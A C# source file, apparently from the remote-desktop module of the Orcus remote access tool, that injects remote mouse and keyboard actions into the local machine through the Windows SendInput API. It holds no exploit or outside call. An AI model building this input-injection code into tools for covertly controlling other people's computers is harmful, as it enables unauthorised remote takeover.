using System;
using System.Drawing;
using System.Windows.Forms;
using Orcus.Native;
using Orcus.Shared.Commands.RemoteDesktop;

namespace Orcus.Commands.RemoteDesktop
{
    public class RemoteActions
    {
        const int XBUTTON1 = 0x00000001;
        const int XBUTTON2 = 0x00000002;

        private readonly Screen[] _screens;
        private readonly Rectangle _virtualScreen;

        public RemoteActions()
        {
            _virtualScreen = SystemInformation.VirtualScreen;
            _screens = Screen.AllScreens;
        }

        public void DoMouseAction(RemoteDesktopMouseAction mouseAction, int x, int y, int extraData, int monitor)
        {
            var screen = _screens[monitor];
            x = screen.Bounds.X + x;
            y = screen.Bounds.Y + y;

            INPUT mouseDownInput = new INPUT();
            mouseDownInput.type = InputType.MOUSE;
            mouseDownInput.U.mi.dwFlags = MouseActionToMouseEvent(mouseAction, ref extraData) | MOUSEEVENTF.ABSOLUTE |
                                          MOUSEEVENTF.VIRTUALDESK | MOUSEEVENTF.MOVE;
            mouseDownInput.U.mi.dx = CalculateAbsoluteCoordinateX(x);
            mouseDownInput.U.mi.dy = CalculateAbsoluteCoordinateY(y);
            mouseDownInput.U.mi.mouseData = extraData;

            SendIput(mouseDownInput);
        }

        public void DoKeyboardAction(RemoteDesktopKeyboardAction keyboardAction, short scanCode)
        {
            INPUT keyboardInput = new INPUT();
            keyboardInput.type = InputType.KEYBOARD;
            keyboardInput.U.ki.wScan = scanCode;
            keyboardInput.U.ki.dwFlags = KEYEVENTF.SCANCODE;

            if (keyboardAction == RemoteDesktopKeyboardAction.KeyUp)
                keyboardInput.U.ki.dwFlags |= KEYEVENTF.KEYUP;

            keyboardInput.U.ki.dwExtraInfo = UIntPtr.Zero;
            keyboardInput.U.ki.time = 0;

            SendIput(keyboardInput);
        }

        private void SendIput(INPUT input)
        {
            var inputs = new INPUT[1];
            inputs[0] = input;
            NativeMethods.SendInput(1, inputs, INPUT.Size);
        }

        private int CalculateAbsoluteCoordinateX(int x)
        {
            return (int) (x*65536f/_virtualScreen.Width);
        }

        private int CalculateAbsoluteCoordinateY(int y)
        {
            return (int) (y*65536f/_virtualScreen.Height);
        }

        private static MOUSEEVENTF MouseActionToMouseEvent(RemoteDesktopMouseAction mouseAction, ref int mouseData)
        {
            switch (mouseAction)
            {
                case RemoteDesktopMouseAction.LeftDown:
                    return MOUSEEVENTF.LEFTDOWN;
                case RemoteDesktopMouseAction.LeftUp:
                    return MOUSEEVENTF.LEFTUP;
                case RemoteDesktopMouseAction.RightDown:
                    return MOUSEEVENTF.RIGHTDOWN;
                case RemoteDesktopMouseAction.RightUp:
                    return MOUSEEVENTF.RIGHTUP;
                case RemoteDesktopMouseAction.MiddleDown:
                    return MOUSEEVENTF.MIDDLEDOWN;
                case RemoteDesktopMouseAction.MiddleUp:
                    return MOUSEEVENTF.MIDDLEUP;
                case RemoteDesktopMouseAction.XButton1Down:
                    mouseData = XBUTTON1;
                    return MOUSEEVENTF.XDOWN;
                case RemoteDesktopMouseAction.XButton1Up:
                    mouseData = XBUTTON1;
                    return MOUSEEVENTF.XUP;
                case RemoteDesktopMouseAction.XButton2Down:
                    mouseData = XBUTTON2;
                    return MOUSEEVENTF.XDOWN;
                case RemoteDesktopMouseAction.XButton2Up:
                    mouseData = XBUTTON2;
                    return MOUSEEVENTF.XUP;
                case RemoteDesktopMouseAction.Move:
                    return MOUSEEVENTF.MOVE;
                case RemoteDesktopMouseAction.Wheel:
                    return MOUSEEVENTF.WHEEL;
                default:
                    throw new ArgumentOutOfRangeException(nameof(mouseAction), mouseAction, null);
            }
        }

        /*
        public static void DoMouseButtonEvent(RemoteDesktopMouseAction mouseAction, uint x, uint y, uint extra)
        {
            MouseEventFlags mouseEventFlags;
            uint eventData = extra;

            switch (mouseAction)
            {
                case RemoteDesktopMouseAction.LeftDown:
                    mouseEventFlags = MouseEventFlags.LEFTDOWN;
                    break;
                case RemoteDesktopMouseAction.LeftUp:
                    mouseEventFlags = MouseEventFlags.LEFTUP;
                    break;
                case RemoteDesktopMouseAction.RightDown:
                    mouseEventFlags = MouseEventFlags.RIGHTDOWN;
                    break;
                case RemoteDesktopMouseAction.RightUp:
                    mouseEventFlags = MouseEventFlags.RIGHTUP;
                    break;
                case RemoteDesktopMouseAction.MiddleDown:
                    mouseEventFlags = MouseEventFlags.MIDDLEDOWN;
                    break;
                case RemoteDesktopMouseAction.MiddleUp:
                    mouseEventFlags = MouseEventFlags.MIDDLEUP;
                    break;
                case RemoteDesktopMouseAction.XButton1Down:
                    mouseEventFlags = MouseEventFlags.XDOWN;
                    eventData = XBUTTON1;
                    break;
                case RemoteDesktopMouseAction.XButton1Up:
                    mouseEventFlags = MouseEventFlags.XUP;
                    eventData = XBUTTON1;
                    break;
                case RemoteDesktopMouseAction.XButton2Down:
                    mouseEventFlags = MouseEventFlags.XDOWN;
                    eventData = XBUTTON2;
                    break;
                case RemoteDesktopMouseAction.XButton2Up:
                    mouseEventFlags = MouseEventFlags.XUP;
                    eventData = XBUTTON2;
                    break;
                case RemoteDesktopMouseAction.Move:
                    mouseEventFlags = MouseEventFlags.MOVE;
                    break;
                case RemoteDesktopMouseAction.Wheel:
                    mouseEventFlags = MouseEventFlags.WHEEL;
                    break;
                default:
                    throw new ArgumentOutOfRangeException(nameof(mouseAction), mouseAction, null);
            }

            NativeMethods.mouse_event(mouseEventFlags, x, y, eventData, UIntPtr.Zero);
        }*/
    }
}